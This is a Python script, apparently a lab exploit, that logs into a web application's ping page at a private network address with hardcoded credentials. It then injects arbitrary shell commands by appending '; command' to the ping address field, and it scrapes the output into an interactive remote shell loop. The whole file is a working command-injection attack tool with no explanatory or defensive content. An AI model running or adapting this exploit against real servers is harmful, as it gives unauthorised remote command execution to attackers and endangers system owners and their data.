# -*- coding: utf-8 -*-
#Command Injection: 
import requests

def login():
	URL="http://192.168.0.7:9090/login"
	COOKIES = setSessionCookie(URL)
	post_data={'username':'gorkem','password':'gorkem'}
	post_request=requests.post(URL,data=post_data,cookies=COOKIES)
	return COOKIES


def setSessionCookie(URL):
	pre_req = requests.get(URL)
	return pre_req.cookies

def excCommand(excCommand):
	URL="http://192.168.0.7:9090/app/ping"
	COOKIES=login()
	post_data={'address':"127.0.0.1 ;" + excCommand}
	post_request=requests.post(URL,data=post_data,cookies=COOKIES)
	out = getPrint(post_request.text)
	print(out)
	return out

def getPrint(FULL_TEXT):
	HINT_STRING="<pre>"
	HINT_STRING_STOP="</pre>"
	temp=""
	TEXT_LIST=FULL_TEXT.split("\n")
	IsOutput=False
	for line in TEXT_LIST:
		if HINT_STRING in line:
			IsOutput=True
		if HINT_STRING_STOP in line:
			IsOutput=False
			break
		if IsOutput:
			temp+=line
			temp+="\n"
	temp=temp.replace("<pre>","")
	output=temp
	return output
if __name__ == '__main__':
	while True:
		command = input("Enter the command: ")
		if command == "stop":
			break
		excCommand(command)
		#print(excCommand(command))
		
			
